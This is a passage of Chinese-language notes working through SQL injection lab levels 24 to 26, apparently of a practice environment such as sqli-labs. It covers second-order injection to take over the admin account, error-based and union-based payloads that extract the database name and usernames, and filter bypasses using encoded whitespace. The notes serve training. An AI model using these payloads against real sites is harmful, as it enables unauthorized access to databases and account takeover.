文件读取的操作，前提条件

  4. 写文件目标目录是否可写

二次排序注入

二次排序注入也成为存储型的注入，就是将可能导致 sql 注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以出发 sql 注入。

第二十四关

先注册账号（admin’ #） => 修改密码（admin’ #） => 设置新密码 => 账号名经过SQL语句更新时变成了 admin 账号

这两种都可以 ( admin’ – 123 | admin’ # )

常规注入

第二十五关

对 or and 进行了过滤

?id=1.1'||updatexml(1,concat(0x7e,(select database()),0x7e),1) -- 123

第二十五a关

这一关同上一关过滤了 and or ，关闭了报错信息

?id=1.1 union select 1,group_concat(username),3 from users

第二十六关

结合上面的一起过滤

or，and, /* , # , –, / 等各种符号过滤，对于 and，or 的过滤，可以使用&& || 来替代

字符介绍
%09TAB键（水平）
%0a新建一行
%0c新的一页
%0dreturn功能
%0bTAB键（垂直）
%a0空格
?id=1.1'||'1 // 检测有无注入，这里的环境存在问题，无法正常解析以上字符

?id=1.1'union%0aselect%0a1,2,3||'1

和26关一样，只不过是增加了括号
